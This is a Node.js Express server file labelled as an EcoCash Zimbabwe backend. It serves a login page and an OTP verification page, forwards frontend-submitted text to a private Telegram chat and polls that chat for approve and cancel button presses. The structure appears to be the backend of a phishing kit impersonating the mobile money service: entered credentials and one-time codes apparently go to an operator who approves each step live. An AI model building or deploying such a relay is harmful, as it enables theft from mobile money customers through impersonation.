const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

// ========== MIDDLEWARE ==========
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ========== HEALTHCHECK (Railway uses /health) ==========
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok', service: 'ecocash-zimbabwe', time: new Date().toISOString() });
});

// ========== STATIC FILES ==========
// Serve everything in backend/ (verify.html lives here).
// NOTE: the login file has NO extension, so express.static won't serve it as HTML.
// We handle /login explicitly below.
app.use(express.static(__dirname));

// ========== PAGES ==========

// Login page (extensionless file: backend/login)
app.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'login'), (err) => {
    if (err) {
      console.error('login sendFile error:', err.message);
      res.status(500).send('Login page not found');
    }
  });
});

// Root -> redirect to login
app.get('/', (req, res) => {
  res.redirect('/login');
});

// OTP verify page (served explicitly so /verify works too)
app.get('/verify', (req, res) => {
  res.sendFile(path.join(__dirname, 'verify.html'));
});

// ========== API STUBS ==========
app.get('/api/status', (req, res) => {
  res.json({
    ok: true,
    region: process.env.REGION || 'ZW',
    provider: process.env.PROVIDER || 'EcoCash',
    telegramConfigured: Boolean(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID)
  });
});

// ========== TELEGRAM (server-side, uses Railway Variables) ==========
// Frontend calls POST /api/notify with { text, replyMarkup? }.
// Server reads TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID and sends to Telegram.
app.post('/api/notify', async (req, res) => {
  try {
    const { text, replyMarkup } = req.body || {};
    if (!text) return res.status(400).json({ ok: false, error: 'missing text' });

    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    if (!token || !chatId) {
      console.error('Telegram env missing: TELEGRAM_BOT_TOKEN and/or TELEGRAM_CHAT_ID');
      return res.status(500).json({ ok: false, error: 'telegram env not set' });
    }

    const payload = { chat_id: chatId, text, parse_mode: 'Markdown' };
    if (replyMarkup) payload.reply_markup = replyMarkup;

    const tgRes = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    const tgData = await tgRes.json();
    console.log('Telegram sendMessage ->', tgRes.status, 'ok=' + tgData.ok, tgData.description || '');

    return res.status(tgRes.ok ? 200 : 502).json(tgData);
  } catch (err) {
    console.error('notify error:', err.message);
    return res.status(500).json({ ok: false, error: err.message });
  }
});

// Frontend polls GET /api/updates?offset=N&timeout=10 for approve/cancel callbacks.
app.get('/api/updates', async (req, res) => {
  try {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    if (!token) return res.status(500).json({ ok: false, error: 'telegram env not set' });

    const offset = parseInt(req.query.offset || '0', 10);
    const timeout = parseInt(req.query.timeout || '10', 10);
    const r = await fetch(
      `https://api.telegram.org/bot${token}/getUpdates?offset=${offset}&timeout=${timeout}`
    );
    const data = await r.json();
    return res.status(r.ok ? 200 : 502).json(data);
  } catch (err) {
    console.error('updates error:', err.message);
    return res.status(500).json({ ok: false, error: err.message });
  }
});

// Answer a callback query (removes the loading state on the Telegram button)
app.post('/api/answer', async (req, res) => {
  try {
    const { callbackQueryId } = req.body || {};
    if (!callbackQueryId) return res.status(400).json({ ok: false, error: 'missing callbackQueryId' });
    const token = process.env.TELEGRAM_BOT_TOKEN;
    if (!token) return res.status(500).json({ ok: false, error: 'telegram env not set' });

    const r = await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callbackQueryId })
    });
    const data = await r.json();
    return res.status(r.ok ? 200 : 502).json(data);
  } catch (err) {
    console.error('answer error:', err.message);
    return res.status(500).json({ ok: false, error: err.message });
  }
});

// ========== 404 ==========
app.use((req, res) => {
  res.status(404).send('Not found');
});

// ========== START ==========
app.listen(PORT, '0.0.0.0', () => {
  console.log(`EcoCash Zimbabwe backend running on port ${PORT}`);
  console.log(
    'Telegram env:',
    process.env.TELEGRAM_BOT_TOKEN ? 'TOKEN set' : 'TOKEN MISSING',
    '|',
    process.env.TELEGRAM_CHAT_ID ? 'CHAT_ID set' : 'CHAT_ID MISSING'
  );
});
